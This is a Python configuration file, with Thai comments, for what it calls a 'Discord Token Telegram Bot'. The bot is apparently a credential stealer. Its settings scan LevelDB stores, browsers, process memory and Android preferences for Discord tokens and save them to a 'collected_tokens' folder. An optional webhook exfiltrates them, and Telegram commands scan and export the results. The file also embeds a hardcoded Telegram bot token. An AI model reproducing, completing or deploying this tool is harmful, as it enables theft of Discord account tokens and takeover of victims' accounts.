#!/usr/bin/env python3
"""
Configuration for Discord Token Telegram Bot
"""

import os

# ======== TELEGRAM BOT ========
TELEGRAM_BOT_TOKEN = "8836462015:AAE0InG3w8vRCD1BPYruTqylmjAxcPLWsos"
ALLOWED_USERS = []  # Telegram User IDs ที่อนุญาต (ว่าง = อนุญาตทุกคน)

# ======== WEBHOOK (Optional) ========
EXFILTRATE_WEBHOOK = False
DISCORD_WEBHOOK_URL = ""

# ======== OUTPUT ========
OUTPUT_DIR = "collected_tokens"
LOG_FILE = "bot_activity.log"

# ======== SCAN SETTINGS ========
SCAN_LEVELDB = True
SCAN_MEMORY = False  # ต้อง root
SCAN_BROWSERS = True
SCAN_ANDROID_PREFS = False  # ต้อง root
MAX_TOKENS_PER_SCAN = 50  # ป้องกัน overload

# ======== COMMAND PERMISSIONS ========
COMMAND_PERMISSIONS = {
    "start": "all",
    "help": "all",
    "scan": "all", 
    "fullscan": "root",
    "status": "all",
    "info": "all",
    "tokens": "all",
    "export": "all",
    "clear": "owner",
    "broadcast": "owner",
}
